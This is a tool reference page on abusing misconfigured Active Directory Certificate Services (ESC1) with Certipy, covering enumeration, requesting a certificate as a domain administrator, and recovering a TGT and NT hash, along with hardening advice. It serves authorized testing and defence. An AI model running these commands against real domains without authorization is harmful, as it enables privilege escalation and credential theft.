# AD Certificate Services Abuse (ADCS / Certipy)

> Active Directory Certificate Services is a common, high-impact privilege-
> escalation path. Misconfigured certificate templates (the "ESC" issues) let a
> low-privileged user obtain a certificate that authenticates as anyone —
> including Domain Admin. Certipy is the standard tool to find and abuse them.

- **Link:** https://github.com/ly4k/Certipy
- **Type:** open source
- **Platform:** cross-platform (Python)

## Description

When an organisation runs a Certificate Authority (AD CS), users can enrol for
certificates based on **templates**. If a template is misconfigured, a
low-privileged user can request a certificate that lets them authenticate as a
privileged account. SpecterOps catalogued these as **ESC1–ESC16**; the classic
**ESC1** is a template that allows client authentication *and* lets the enrollee
supply an arbitrary Subject Alternative Name (SAN) — so you request a cert "as"
a Domain Admin, then use it to get that account's Kerberos TGT and NTLM hash.
**Certipy** enumerates the CA and templates, flags vulnerable ones, requests the
malicious cert, and authenticates with it.

> Reference-level only: this page shows how to *find* and demonstrate the
> canonical ESC1 issue on systems you are authorized to test. AD CS hardening is
> a standard part of a professional AD assessment.

## Installation

```bash
# Recommended: isolated install
pipx install certipy-ad
```

## Usage examples

```bash
# Enumerate CAs and templates; flag vulnerable ones (writes text + JSON reports)
certipy find -u jsmith@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.1 -vulnerable -stdout

# ESC1: request a cert for a vulnerable template, supplying a privileged SAN
certipy req -u jsmith@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.1 \
    -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local'

# Authenticate with the issued .pfx to recover a TGT and the NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

The recovered NT hash / TGT then feeds pass-the-hash or pass-the-ticket via
[Impacket](impacket.md), [NetExec](netexec.md) or [Evil-WinRM](evil-winrm.md).

## Notes & references

- `certipy find -vulnerable` labels each finding with its ESC identifier — start
  there and read the reported abuse conditions before acting.
- Defence: audit template enrollment rights, disable `ENROLLEE_SUPPLIES_SUBJECT`
  where not needed, restrict who can enrol, and enable CA auditing.
- Certipy wiki (per-ESC walkthroughs): https://github.com/ly4k/Certipy/wiki
- Original research "Certified Pre-Owned" (SpecterOps):
  https://posts.specterops.io/certified-pre-owned-d95910965cd2
